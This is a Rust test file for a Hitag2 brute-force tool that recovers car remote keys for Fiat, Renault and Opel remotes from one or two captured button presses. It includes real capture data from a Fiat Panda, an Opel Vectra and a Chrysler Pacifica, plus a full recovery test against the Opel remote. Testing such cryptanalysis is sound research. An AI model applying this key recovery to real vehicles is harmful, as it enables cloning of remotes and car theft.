    /// The search driver returns the lowest accepted candidate for any thread interleaving and
    /// honours cancel.
    #[test]
    fn search_returns_lowest_hit_and_honours_cancel() {
        let ctl = BruteForceControl::default();
        let fake = |c: u32, out: &mut Vec<u64>| {
            out.clear();
            out.push(c as u64);
        };
        let hits = [700u32, 3, 9, 650];
        let found = search(0..800, &ctl, fake, |c, s: &[u64]| hits.contains(&c).then_some(s[0]));
        assert_eq!(found, Ok(Some((3, 3))));
        assert_eq!(search(0..800, &ctl, fake, |_, _| None::<()>), Ok(None));
        assert_eq!(search(10..20, &ctl, fake, |c, _| (c == 19).then_some(())), Ok(Some((19, ()))));
        let cancelled = BruteForceControl::default();
        cancelled.cancel.store(true, Ordering::Relaxed);
        assert_eq!(search(0..800, &cancelled, fake, |_, _| None::<()>), Err(()));
        let req = known_request(&KNOWN[0]);
        assert_eq!(recover_key(&req, &cancelled), BruteForceOutcome::Cancelled);
    }

    /// End to end on the true candidate (and its neighbours): the key is recovered, with the
    /// C's state and UID; a wrong second hop or a counter ≥ 1024 finds nothing; one frame
    /// returns that candidate's state's key.
    #[test]
    fn restricted_search_recovers_known_keys() {
        for k in &KNOWN[..2] {
            let (key, uid, _, _, init_state, _, cand) = *k;
            let req = known_request(k);
            let got = recover_range(&[req], cand - 1..cand + 2, default_width());
            let want = RecoveredKey { key, uid, state: init_state, request: 0, candidate: cand };
            assert_eq!(got, BruteForceOutcome::Found(want));
            let one = Hitag2Request { second: None, ..req };
            assert_eq!(recover_range(&[one], cand..cand + 1, Width::W32), BruteForceOutcome::Found(want));
            let mut wrong = req;
            wrong.second.as_mut().unwrap().hop ^= 1;
            assert_eq!(recover_range(&[wrong], cand..cand + 1, default_width()), BruteForceOutcome::NotFound);
            let big = Hitag2Request { cnt: req.cnt | 0x400, ..one };
            assert_eq!(recover_range(&[big], cand..cand + 1, default_width()), BruteForceOutcome::NotFound);
        }
    }

    /// A 104-bit Fiat V1 / Renault V1 decode (`00 01 uid btn/cnt hop tail xor`, `extra` = bytes
    /// 8..13 | TE variant << 40) built from its fields.
    fn signal104(uid: u32, btn: u8, cnt: u32, hop: u32, variant: u64) -> DecodedSignal {
        let mut raw = [0u8; 13];
        raw[1] = 0x01;
        raw[2..6].copy_from_slice(&uid.to_be_bytes());
        raw[6] = (btn << 4) | ((cnt >> 6) & 0x0F) as u8;
        raw[7] = (((cnt & 0x3F) << 2) as u8) | (hop >> 30) as u8;
        raw[8] = (hop >> 22) as u8;
        raw[9] = (hop >> 14) as u8;
        raw[10] = (hop >> 6) as u8;
        raw[11] = ((hop << 2) as u8) | 0b10;
        raw[12] = raw[2..12].iter().fold(0, |a, b| a ^ b);
        let mut extra = [0u8; 8];
        extra[3..].copy_from_slice(&raw[8..]);
        DecodedSignal {
            serial: Some(uid),
            button: Some(btn),
            counter: Some(cnt as u16),
            crc_valid: true,
            data: u64::from_be_bytes(raw[..8].try_into().unwrap()),
            data_count_bit: 104,
            encoder_capable: true,
            extra: Some(u64::from_be_bytes(extra) | (variant << 40)),
            protocol_display_name: None,
        }
    }

    /// KAT's decodes → qDoctor's request fields: the Fiat Panda and Opel Vectra captures (golden
    /// `data` / `extra` of `testdata/imports_decodes.txt`) and a Chrysler Pacifica Fiat V2 frame.
    #[test]
    fn maps_real_decodes() {
        let sig = |data: u64, extra: u64, bits: usize| DecodedSignal {
            data,
            extra: Some(extra),
            data_count_bit: bits,
            ..DecodedSignal::new(data, bits)
        };
        // FIAT/Fiat Panda.sub (variant A): UID EFB82D66, Trunk, control 0x08D, hop 299BD53E.
        let panda = frame_of("Fiat V1", &sig(0x0001_EFB8_2D66_2234, 0xA6_6F54_FA6D, 104)).unwrap();
        let want = Hitag2Frame { remote: Hitag2Remote::FiatV1, uid: 0xEFB8_2D66, hop: 0x299B_D53E, cnt: 0x8D, btn: 2 };
        assert_eq!(panda, want);
        assert_eq!(
            requests_for(&panda, None).unwrap(),
            [Hitag2Request { hop: 0x299B_D53E, uid: 0xEFB8_2D66, cnt: 0x8D, btn: 2, second: None }]
        );
        // OPEL/Opel Vectra 2008.sub (variant B): one remote under Fiat V1 and Renault V1.
        let v53 = frame_of("Fiat V1", &sig(0x0001_468F_5D25_114D, 0x01C2_6188_AE68, 104)).unwrap();
        let v57 = frame_of("Renault V1", &sig(0x0001_468F_5D25_115E, 0xFA_649B_36CD, 104)).unwrap();
        assert_eq!((v53.uid, v53.cnt, v53.btn), (0x468F_5D25, 0x53, 1));
        assert_eq!((v57.remote, v57.uid, v57.cnt, v57.btn), (Hitag2Remote::RenaultV1, 0x468F_5D25, 0x57, 1));
        let reqs = requests_for(&v53, Some(&v57)).unwrap();
        assert_eq!(reqs.len(), 1);
        assert_eq!(reqs[0].second, Some(SecondFrame { hop: v57.hop, cnt: 0x57, btn: 1 }));
        // chrysler/19_chrysler_pacifica… (Fiat V2, non-FCA layout): selector 3, counter 0x09B.
        let fca = frame_of("Fiat V2", &sig(0x0001_D737_A2C3_5EFB, 0x2023_5C16_7DE9, 112)).unwrap();
        assert_eq!(fca, Hitag2Frame { remote: Hitag2Remote::FiatV2, uid: 0xD737_A2C3, hop: 0x235C_167D, cnt: 0x09B, btn: 3 });
        let reqs = requests_for(&fca, None).unwrap();
        let readings: Vec<_> = reqs.iter().map(|r| (r.cnt, r.btn)).collect();
        assert_eq!(readings, [(0x09B, 3), (0x09B, 8)]);
        assert!(reqs.iter().all(|r| r.hop == 0x235C_167D && r.uid == 0xD737_A2C3));
    }

    #[test]
    fn mapping_refuses_what_it_cannot_attack() {
        let f1 = frame_of("Fiat V1", &signal104(0x1122_3344, 4, 0x10, 0xDEAD_BEEF, 1)).unwrap();
        let other_uid = frame_of("Fiat V1", &signal104(0x1122_3345, 4, 0x11, 0xFEED_BEEF, 1)).unwrap();
        assert!(requests_for(&f1, Some(&other_uid)).is_err());
        assert!(requests_for(&f1, Some(&f1)).is_err(), "same press");
        let mut v2 = Hitag2Frame { remote: Hitag2Remote::FiatV2, ..f1 };
        v2.hop ^= 1;
        assert!(requests_for(&f1, Some(&v2)).is_err(), "Fiat V2 with Fiat V1");
        assert!(frame_of("Renault V1 (ARF) [0x04]", &signal104(1, 1, 1, 1, 0)).is_err());
        assert!(frame_of("Datsun Lada", &signal104(1, 1, 1, 1, 0)).is_err());
        assert!(frame_of("PSA", &signal104(1, 1, 1, 1, 0)).is_err());
        let mut bad = signal104(0x1122_3344, 4, 0x10, 0xDEAD_BEEF, 0);
        bad.data ^= 1 << 20; // XOR byte no longer matches
        assert!(frame_of("Fiat V1", &bad).is_err());
        // A Renault V1 frame of the serial-derived (seed) scheme already transmits.
        let (frame, _) = hitag2::renault_encrypt_frame(0xEFB8_2D66, 0x008D, 0x2, 0x0003_A5C1);
        let mut data = [0u8; 8];
        data[1] = 0x01;
        data[2..].copy_from_slice(&frame[..6]);
        let mut extra = [0u8; 8];
        extra[3..].copy_from_slice(&frame[6..]);
        let seeded = DecodedSignal {
            extra: Some(u64::from_be_bytes(extra)),
            ..DecodedSignal::new(u64::from_be_bytes(data), 104)
        };
        assert!(frame_of("Renault V1", &seeded).unwrap_err().contains("seed"));
    }

    /// Frames built with a known Fiat BCM / Renault key go through the mapping and the search
    /// (restricted to the true candidate) and give the key back in each protocol's key order;
    /// Fiat V2 finds the IV reading that signed the frames.
    #[test]
    fn mapping_and_search_round_trip_known_keys() {
        // Fiat V1: ProtoPirate key order (fiat_bcm_authenticator), epoch 0.
        let fiat_key = [0x4D, 0x34, 0x3F, 0xD4, 0xE7, 0xB6];
        let (uid, btn) = (0x5A17_C0DEu32, 0x8u8);
        let hop = |ctl: u16| hitag2::fiat_bcm_authenticator(uid, btn, ctl, &fiat_key, 0);
        let f1 = frame_of("Fiat V1", &signal104(uid, btn, 0x1F0, hop(0x1F0), 0)).unwrap();
        let f2 = frame_of("Fiat V1", &signal104(uid, btn, 0x1F1, hop(0x1F1), 0)).unwrap();
        let reqs = requests_for(&f1, Some(&f2)).unwrap();
        let key48 = u64::from_be_bytes([0, 0, fiat_key[4], fiat_key[5], fiat_key[0], fiat_key[1], fiat_key[2], fiat_key[3]]);
        let cand = candidate_of(f1.hop, init(key48, uid, 0x1F0, btn));
        let BruteForceOutcome::Found(got) = recover_range(&reqs, cand..cand + 1, default_width()) else {
            panic!("Fiat V1 key not found");
        };
        assert_eq!((fiat_bcm_key(got.key), got.uid), (fiat_key, uid));
        // Renault V1: standard key order (renault_authenticator).
        let renault_key = [0x23, 0xA6, 0x57, 0x00, 0x1F, 0x2C];
        let hop = |cnt: u32| hitag2::renault_authenticator(uid, 2, cnt, &renault_key);
        let r1 = frame_of("Renault V1", &signal104(uid, 2, 0x2FE, hop(0x2FE), 0)).unwrap();
        let r2 = frame_of("Renault V1", &signal104(uid, 2, 0x2FF, hop(0x2FF), 0)).unwrap();
        let reqs = requests_for(&r1, Some(&r2)).unwrap();
        let key48 = u64::from_be_bytes([0, 0, 0x23, 0xA6, 0x57, 0x00, 0x1F, 0x2C]);
        let cand = candidate_of(r1.hop, init(key48, uid, 0x2FE, 2));
        let BruteForceOutcome::Found(got) = recover_range(&reqs, cand..cand + 1, default_width()) else {
            panic!("Renault V1 key not found");
        };
        assert_eq!(key_bytes(got.key), renault_key);
        // Fiat V2, two presses with different selectors signed with ARF's one-hot button reading:
        // the search finds the key under reading 1.
        let key48 = u64::from_be_bytes([0, 0, fiat_key[4], fiat_key[5], fiat_key[0], fiat_key[1], fiat_key[2], fiat_key[3]]);
        let v2 = |cnt: u32, sel: u8, hop: u32| Hitag2Frame { remote: Hitag2Remote::FiatV2, uid, hop, cnt, btn: sel };
        let one_hot = |sel: u8| [0, 2, 4, 8][sel as usize];
        let sign = |cnt: u32, btn: u8| hitag2::fiat_bcm_authenticator(uid, btn, (cnt & 0x3FF) as u16, &fiat_key, 0);
        let (c1, c2) = (0x0ABC_u32, 0x0ABD_u32);
        let (f1, f2) = (v2(c1, 3, sign(c1, one_hot(3))), v2(c2, 2, sign(c2, one_hot(2))));
        let reqs = requests_for(&f1, Some(&f2)).unwrap();
        let cand = candidate_of(f1.hop, init(key48, uid, c1 & 0x3FF, 8));
        let BruteForceOutcome::Found(got) = recover_range(&reqs, cand..cand + 1, default_width()) else {
            panic!("Fiat V2 key not found");
        };
        assert_eq!((fiat_bcm_key(got.key), got.request), (fiat_key, 1));
        // Signed with ARF's complemented counter instead: reading 0 verifies first, with the key
        // XOR 0x3FF << 4 (the reading ARF's combo 2 is equivalent to), which signs both presses.
        let sign = |cnt: u32| hitag2::fiat_bcm_authenticator(uid, 3, (!cnt & 0x3FF) as u16, &fiat_key, 0);
        let (f1, f2) = (v2(c1, 3, sign(c1)), v2(c2, 3, sign(c2)));
        let reqs = requests_for(&f1, Some(&f2)).unwrap();
        let cand = candidate_of(f1.hop, init(key48, uid, !c1 & 0x3FF, 3));
        let BruteForceOutcome::Found(got) = recover_range(&reqs, cand..cand + 1, default_width()) else {
            panic!("Fiat V2 equivalent key not found");
        };
        assert_eq!((got.key, got.request), (key48 ^ (0x3FF << 4), 0));
        for f in [f1, f2] {
            assert_eq!(hitag2::fiat_bcm_authenticator(uid, 3, (f.cnt & 0x3FF) as u16, &fiat_bcm_key(got.key), 0), f.hop);
        }
    }

    // -----------------------------------------------------------------------------------------
    // Long runs (release build): `cargo test --release hitag2_hell -- --ignored --nocapture
    // --test-threads=1 <name>`
    // -----------------------------------------------------------------------------------------

    use std::time::Instant;

    /// The six presses of `IMPORTS/OPEL/Opel Vectra 2008.sub` (golden `data` / `extra`, counters
    /// 0x53 … 0x59; the 0x57 press decodes as Renault V1; bit 40 of a Fiat V1 `extra` is the TE
    /// variant, B here).
    const OPEL_VECTRA: [(&str, u64, u64); 6] = [
        ("Fiat V1", 0x0001_468F_5D25_114D, 0x01C2_6188_AE68),
        ("Fiat V1", 0x0001_468F_5D25_1150, 0x01DA_CE69_3AB7),
        ("Fiat V1", 0x0001_468F_5D25_115A, 0x01FA_CCD3_1609),
        ("Renault V1", 0x0001_468F_5D25_115E, 0x00FA_649B_36CD),
        ("Fiat V1", 0x0001_468F_5D25_1160, 0x01E2_88DC_5E28),
        ("Fiat V1", 0x0001_468F_5D25_1164, 0x01E2_215F_FEA6),
    ];

    fn opel_frames() -> Vec<Hitag2Frame> {
        OPEL_VECTRA
            .iter()
            .map(|&(name, data, extra)| {
                let sig = DecodedSignal { extra: Some(extra), ..DecodedSignal::new(data, 104) };
                frame_of(name, &sig).unwrap()
            })
            .collect()
    }

    /// Kernel cost of each lane word on the candidate samples the C timing uses (hop F003694F):
    /// every 1024th candidate on one thread, every 128th on all cores (the oracle's `kstride`).
    #[test]
    #[ignore]
    fn bench_lane_widths() {
        let hop = 0xF003_694F;
        let kernels = [
            ("u32 (C word)", Kernel::new(hop, Width::W32)),
            ("u64", Kernel::new(hop, Width::W64)),
            ("X4 portable", Kernel { avx2: false, ..Kernel::new(hop, Width::W256) }),
            ("X4 AVX2", Kernel::new(hop, Width::W256)),
        ];
        let available: Vec<_> = kernels.iter().filter(|(name, k)| *name != "X4 AVX2" || k.avx2).collect();
        let mut reference = None;
        for (name, kernel) in &available {
            let mut out = Vec::new();
            let mut all = Vec::new();
            let t = Instant::now();
            for k in 0..512 {
                kernel.states(k * 1024, &mut out);
                all.extend_from_slice(&out);
            }
            let per = t.elapsed().as_secs_f64() / 512.0;
            eprintln!(
                "{name:>13}: {:.2} ms/candidate on one thread ({} matches), full sweep ≈ {:.2} h",
                per * 1e3,
                all.len(),
                per * SEARCH_TOTAL as f64 / 3600.0
            );
            assert_eq!(reference.get_or_insert_with(|| all.clone()), &all);
        }
        for (name, kernel) in &available {
            let ctl = BruteForceControl::default();
            let t = Instant::now();
            let got = search(0..4096, &ctl, |k, out| kernel.states(k * 128, out), |_, _| None::<()>);
            assert_eq!(got, Ok(None));
            let rate = 4096.0 / t.elapsed().as_secs_f64();
            eprintln!(
                "{name:>13}: {rate:.0} candidates/s on all cores, full sweep ≈ {:.1} min",
                SEARCH_TOTAL as f64 / rate / 60.0
            );
        }
    }

    /// Strided samples of two hops' candidates (7680 in all): the matches of every sampled
    /// candidate, in C order, equal the compiled C's — `oracle kstride <hop> 0 <stride> <count>`
    /// prints the total and an FNV over each non-empty candidate's index and matches.
    #[test]
    #[ignore]
    fn kernel_matches_c_on_strided_samples() {
        let samples = [
            (0xF003_694Fu32, 256u32, 2048u32, 239usize, 0xE294_865C_A883_F067u64),
            (0xF003_694F, 1024, 512, 49, 0x33DB_C05A_2D72_6BDF),
            (0xF003_694F, 128, 4096, 472, 0xA320_7A52_C8AB_7209),
            (0x7AFC_C042, 512, 1024, 101, 0x6EB1_698A_D7D8_1D0C),
        ];
        for (hop, stride, count, total_c, fnv_c) in samples {
            let kernel = kernel(hop, default_width());
            let per: Mutex<Vec<(u32, Vec<u64>)>> = Mutex::new(Vec::new());
            let ctl = BruteForceControl::default();
            let found = search(0..count, &ctl, |k, out| kernel.states(k * stride, out), |k, s: &[u64]| {
                per.lock().unwrap().push((k * stride, s.to_vec()));
                None::<()>
            });
            assert_eq!(found, Ok(None));
            let mut per = per.into_inner().unwrap();
            per.sort();
            let mut flat = Vec::new();
            for (c, states) in per.iter().filter(|(_, s)| !s.is_empty()) {
                flat.push(*c as u64);
                flat.extend_from_slice(states);
            }
            let total: usize = per.iter().map(|(_, s)| s.len()).sum();
            eprintln!("{hop:08X} stride {stride} × {count}: total={total} fnv={:016X}", fnv(&flat));
            assert_eq!((total, fnv(&flat)), (total_c, fnv_c), "{hop:08X} stride {stride}");
        }
    }

    /// A full sweep of one hop: number of matches and order-independent hashes (the oracle's
    /// `sweep` mode). For qDoctor's sample hop 7AFCC042 the count must be the 70473 states
    /// `hitag2hell_recover_cpu_ex` reports (`Hitag2HellResult.states_tested`) after its sweep.
    #[test]
    #[ignore]
    fn full_sweep_statistics() {
        let hop = std::env::var("KAT_HITAG2_SWEEP_HOP").map_or(0x7AFC_C042, |h| u32::from_str_radix(&h, 16).unwrap());
        let kernel = Kernel::new(hop, default_width());
        let (count, xor, sum) = (AtomicU32::new(0), Mutex::new(0u64), Mutex::new(0u64));
        let ctl = BruteForceControl::default();
        let t = Instant::now();
        let found = search(0..SEARCH_TOTAL, &ctl, |c, out| kernel.states(c, out), |_, s: &[u64]| {
            if !s.is_empty() {
                count.fetch_add(s.len() as u32, Ordering::Relaxed);
                let (mut x, mut y) = (xor.lock().unwrap(), sum.lock().unwrap());
                for &v in s {
                    *x ^= v;
                    *y = y.wrapping_add(v.wrapping_mul(0x9E37_79B9_7F4A_7C15));
                }
            }
            None::<()>
        });
        assert_eq!(found, Ok(None));
        eprintln!(
            "hop={hop:08X} states={} xor={:012X} sum={:016X} secs={:.1}",
            count.load(Ordering::Relaxed),
            xor.into_inner().unwrap(),
            sum.into_inner().unwrap(),
            t.elapsed().as_secs_f64()
        );
        if hop == 0x7AFC_C042 {
            assert_eq!(count.load(Ordering::Relaxed), 70_473);
        }
    }

    /// [`recover_key_any`], timed: (outcome, seconds, candidates searched).
    fn timed_recovery(reqs: &[Hitag2Request]) -> (BruteForceOutcome, f64, u32) {
        let ctl = BruteForceControl::default();
        let t = Instant::now();
        let out = recover_key_any(reqs, &ctl);
        (out, t.elapsed().as_secs_f64(), ctl.progress.load(Ordering::Relaxed))
    }

    /// Log a synthetic / published recovery: where the search stopped and how long it took.
    fn log_recovery(label: &str, out: &BruteForceOutcome, secs: f64, searched: u32) {
        let what = match out {
            BruteForceOutcome::Found(k) => format!("found at candidate {} (request {}, UID {:08X})", k.candidate, k.request, k.uid),
            other => format!("{other:?}"),
        };
        eprintln!(
            "{label}: {what} in {secs:.1} s ({searched} of {SEARCH_TOTAL} candidates, full sweep ≈ {:.1} min)",
            secs * SEARCH_TOTAL as f64 / searched.max(1) as f64 / 60.0
        );
    }

    /// qDoctor's "Load Hell sample" (`Hitag2WorkflowController.loadSampleVector`).
    #[test]
    #[ignore]
    fn full_recovery_qdoctor_sample() {
        let req = Hitag2Request {
            hop: 0x7AFC_C042,
            uid: 0x13E9_EC28,
            cnt: 0x231,
            btn: 2,
            second: Some(SecondFrame { hop: 0x7AB0_EC32, cnt: 0x232, btn: 2 }),
        };
        let (out, secs, searched) = timed_recovery(&[req]);
        log_recovery("qDoctor sample", &out, secs, searched);
        let BruteForceOutcome::Found(got) = out else { panic!("{out:?}") };
        assert_eq!(authenticator(got.key, got.uid, 0x231, 2), 0x7AFC_C042);
        assert_eq!(authenticator(got.key, got.uid, 0x232, 2), 0x7AB0_EC32);
        // What qDoctor's C (`hitag2hell_recover_cpu_ex`, OpenMP) returns for the same request:
        // key, state and UID (`Hitag2HellResult`).
        assert_eq!((got.key, got.state, got.uid), (0xE99B_DE9C_2813, 0x7A6B_538B_D997, 0x13E9_EC28));
    }

    /// Full searches for the known-key frames (true candidates at 42 %, 64 % and 91 % of the
    /// sweep).
    #[test]
    #[ignore]
    fn full_recovery_known_keys() {
        for k in &KNOWN {
            let (key, uid, _, _, init_state, _, cand) = *k;
            let (out, secs, searched) = timed_recovery(&[known_request(k)]);
            log_recovery(&format!("key {key:012X}"), &out, secs, searched);
            assert_eq!(out, BruteForceOutcome::Found(RecoveredKey { key, uid, state: init_state, request: 0, candidate: cand }));
        }
    }

    /// The real Opel Vectra remote: the key from its first two presses must sign all six. Nothing
    /// that identifies the key is asserted or printed — not the key, its state, nor where the
    /// search stopped (with that, the key takes a second to recompute): it is a real car's.
    #[test]
    #[ignore]
    fn opel_vectra_key_from_two_captures() {
        let frames = opel_frames();
        let reqs = requests_for(&frames[0], Some(&frames[1])).unwrap();
        let (out, secs, _) = timed_recovery(&reqs);
        let BruteForceOutcome::Found(got) = out else { panic!("no key found") };
        for f in &frames {
            assert_eq!(authenticator(got.key, got.uid, f.cnt, f.btn), f.hop, "press {:#X}", f.cnt);
        }
        eprintln!("Opel Vectra 2008: a key that signs all six presses, found in {:.0} min", secs / 60.0);
    }
}
